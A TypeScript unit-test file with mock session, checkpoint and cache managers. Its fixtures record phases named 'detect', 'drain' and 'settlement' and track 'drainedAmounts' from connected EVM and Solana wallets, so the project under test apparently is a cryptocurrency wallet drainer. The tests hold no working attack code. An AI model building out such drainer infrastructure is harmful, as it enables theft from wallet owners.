/**
 * PHASE 10: SESSION MANAGER - UNIT TESTS
 * Test multi-tab prevention, checkpoints, caching
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'

// Mock implementations for testing
class MockSessionManager {
  sessionId: string
  otherTabsDetected: Set<string> = new Set()
  isActive = true

  constructor() {
    const uniqueId = `${Date.now()}-${Math.random().toString(36).slice(2, 9)}`
    this.sessionId = 'test-' + uniqueId
  }

  detectMultipleTabs(): boolean {
    return this.otherTabsDetected.size > 0
  }

  killOtherTabs(): void {
    for (const sessionId of this.otherTabsDetected) {
      console.log(`[TEST] Killing ${sessionId}`)
    }
  }

  terminateSession(): void {
    this.isActive = false
  }
}

class MockStateManager {
  checkpoints: Map<string, any> = new Map()

  saveCheckpoint(cp: any): boolean {
    this.checkpoints.set(cp.sessionId, cp)
    return true
  }

  loadLastCheckpoint(): any | null {
    if (this.checkpoints.size === 0) return null
    const entries = Array.from(this.checkpoints.values())
    const sorted = entries.sort((a, b) => b.timestamp - a.timestamp)
    return sorted[0]
  }
}

class MockCacheManager {
  balanceCache: Map<string, any> = new Map()
  gaspriceCache: Map<string, any> = new Map()

  cacheBalance(address: string, balance: number): void {
    this.balanceCache.set(address, {
      value: balance,
      expiresAt: Date.now() + 5 * 60 * 1000,
    })
  }

  getBalance(address: string): number | null {
    const entry = this.balanceCache.get(address)
    if (!entry) return null
    if (Date.now() > entry.expiresAt) {
      this.balanceCache.delete(address)
      return null
    }
    return entry.value
  }

  cacheGasPrice(chain: string, gasPrice: number): void {
    this.gaspriceCache.set(chain, {
      value: gasPrice,
      expiresAt: Date.now() + 1 * 60 * 1000,
    })
  }

  getGasPrice(chain: string): number | null {
    const entry = this.gaspriceCache.get(chain)
    if (!entry) return null
    if (Date.now() > entry.expiresAt) {
      this.gaspriceCache.delete(chain)
      return null
    }
    return entry.value
  }

  clearAll(): void {
    this.balanceCache.clear()
    this.gaspriceCache.clear()
  }
}

describe('SessionManager', () => {
  let sessionMgr: MockSessionManager

  beforeEach(() => {
    sessionMgr = new MockSessionManager()
  })

  it('should create unique session ID', () => {
    const sessionMgr2 = new MockSessionManager()
    expect(sessionMgr.sessionId).not.toBe(sessionMgr2.sessionId)
  })

  it('should detect multiple tabs', () => {
    sessionMgr.otherTabsDetected.add('other-session-123')
    const hasMultipleTabs = sessionMgr.detectMultipleTabs()
    expect(hasMultipleTabs).toBe(true)
  })

  it('should kill other tabs', () => {
    sessionMgr.otherTabsDetected.add('tab1')
    sessionMgr.otherTabsDetected.add('tab2')
    sessionMgr.killOtherTabs()
    expect(sessionMgr.otherTabsDetected.size).toBe(2)
  })

  it('should terminate session', () => {
    sessionMgr.terminateSession()
    expect(sessionMgr.isActive).toBe(false)
  })

  it('should be initially active', () => {
    expect(sessionMgr.isActive).toBe(true)
  })
})

describe('StateManager', () => {
  let stateMgr: MockStateManager

  beforeEach(() => {
    stateMgr = new MockStateManager()
  })

  it('should save checkpoint', () => {
    const cp = {
      sessionId: 'test-123',
      timestamp: Date.now(),
      phase: 'drain',
      walletsConnected: { evm: '0xabc' },
      drainedAmounts: { evm: 100 },
    }
    const result = stateMgr.saveCheckpoint(cp)
    expect(result).toBe(true)
    expect(stateMgr.checkpoints.size).toBe(1)
  })

  it('should load last checkpoint', () => {
    const cp1 = { sessionId: 'test-1', timestamp: Date.now() - 1000, phase: 'detect' }
    const cp2 = { sessionId: 'test-1', timestamp: Date.now(), phase: 'drain' }

    stateMgr.saveCheckpoint(cp1)
    stateMgr.saveCheckpoint(cp2)

    const loaded = stateMgr.loadLastCheckpoint()
    expect(loaded.phase).toBe('drain') // Should get most recent
  })

  it('should return null when no checkpoints', () => {
    const loaded = stateMgr.loadLastCheckpoint()
    expect(loaded).toBeNull()
  })
})

describe('CacheManager', () => {
  let cacheMgr: MockCacheManager

  beforeEach(() => {
    cacheMgr = new MockCacheManager()
  })

  it('should cache balance', () => {
    cacheMgr.cacheBalance('0xabc', 5.5)
    const balance = cacheMgr.getBalance('0xabc')
    expect(balance).toBe(5.5)
  })

  it('should cache gas price', () => {
    cacheMgr.cacheGasPrice('ethereum', 150)
    const gasPrice = cacheMgr.getGasPrice('ethereum')
    expect(gasPrice).toBe(150)
  })

  it('should expire cache entries', async () => {
    cacheMgr.cacheBalance('0xabc', 5.5)

    // Simulate expiry by manually manipulating expiration
    const entry = cacheMgr.balanceCache.get('0xabc')
    if (entry) {
      entry.expiresAt = Date.now() - 1000 // Expired
    }

    const balance = cacheMgr.getBalance('0xabc')
    expect(balance).toBeNull()
  })

  it('should clear all cache', () => {
    cacheMgr.cacheBalance('0xabc', 5.5)
    cacheMgr.cacheGasPrice('ethereum', 150)
    expect(cacheMgr.balanceCache.size).toBe(1)
    expect(cacheMgr.gaspriceCache.size).toBe(1)

    cacheMgr.clearAll()
    expect(cacheMgr.balanceCache.size).toBe(0)
    expect(cacheMgr.gaspriceCache.size).toBe(0)
  })
})

describe('Session Lifecycle', () => {
  it('should prevent concurrent execution', () => {
    const session1 = new MockSessionManager()
    const session2 = new MockSessionManager()

    // Simulate other tab detection
    session2.otherTabsDetected.add(session1.sessionId)

    const hasConflict = session2.detectMultipleTabs()
    expect(hasConflict).toBe(true)

    // Session 1 should kill session 2
    session1.killOtherTabs()

    // Verify
    expect(session1.isActive).toBe(true)
  })

  it('should recover from checkpoint', () => {
    const session = new MockSessionManager()
    const state = new MockStateManager()

    const checkpoint = {
      sessionId: session.sessionId,
      timestamp: Date.now(),
      phase: 'settlement',
      walletsConnected: { evm: '0xwallet', solana: '0xsol' },
      drainedAmounts: { evm: 500, solana: 300 },
      settledChains: ['evm'],
    }

    state.saveCheckpoint(checkpoint)
    const recovered = state.loadLastCheckpoint()

    expect(recovered.phase).toBe('settlement')
    expect(recovered.walletsConnected.evm).toBe('0xwallet')
    expect(recovered.settledChains.length).toBe(1)
  })
})
